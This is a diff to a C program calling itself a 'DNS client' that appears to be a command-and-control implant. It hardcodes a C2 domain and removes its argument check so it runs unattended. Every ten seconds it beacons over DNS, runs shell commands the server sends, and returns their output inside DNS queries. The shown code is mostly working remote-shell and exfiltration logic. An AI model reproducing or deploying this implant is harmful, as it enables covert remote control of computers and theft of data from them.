@@ -8,17 +8,18 @@
 #include "linked-list.h"	// list definitions and structs
 
 unsigned int napTime = 10;
-unsigned char *defaultHost = "23479038753123213.";
+unsigned char *defaultHost = "23479038753123213";
+unsigned char *defaultDomain = ".domain.com";
 
 void main(int argc, char *argv[])
 {
 	// error checking for argument order and count
-	if(argc != 2)
-	{
-		puts("[-] Welcome to DNS client 1.0 \n");
-		puts("[-] Usage: ./dns-client your-domain.com \n");
-		exit(1);
-	}
+	//if(argc != 2)
+	//{
+	//	puts("[-] Welcome to DNS client 1.0 \n");
+	//	puts("[-] Usage: ./dns-client your-domain.com \n");
+	//	exit(1);
+	//}
 
 	int stdoutBuffSize = 0, recvBuffSize = 0, sendBuffSize = 0, taskType = 0;
 	unsigned char *recvBuff, *sendBuff, *stdoutBuff, *task;
@@ -34,7 +35,7 @@ void main(int argc, char *argv[])
 
 	// send initial query and receive response
 	// encrypt, encode, createPacket, sendPacket
-	sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO, defaultHost, argv[1], &sendBuffSize);
+	sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO, defaultHost, defaultDomain, &sendBuffSize);
 	recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
 
 	// create dns packet buffer
@@ -56,9 +57,7 @@ void main(int argc, char *argv[])
 			/* ========================================================= */
 			case MESSAGE_TYPE_SHELL_CMD:
 
-				//printControlFields(ctrl); exit(1);
-			    // add shell command to task queue OR..
-				// run command and add list of stdout to stdoutList
+				// run command and add stdout to stdoutList
 				stdoutBuffSize = shellCommand(ctrl->message, &stdoutBuff);
 				struct NODE *tempList = constructStdoutList(stdoutBuff, stdoutBuffSize);
 
@@ -93,19 +92,22 @@ void main(int argc, char *argv[])
 		{
 			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_CMD_OUTPUT,
 												curJob->data,
-													argv[1],
+													defaultDomain,
 														&sendBuffSize);
 		}
 		else
 		{
 			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO,
 												defaultHost,
-													argv[1],
+													defaultDomain,
 														&sendBuffSize);
 		}
 
 		sleep(napTime);
 		recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);
+
+		// clear buffers
+		memset(sendBuff, 0, sendBuffSize);
 
 	} // end while
 } // end main
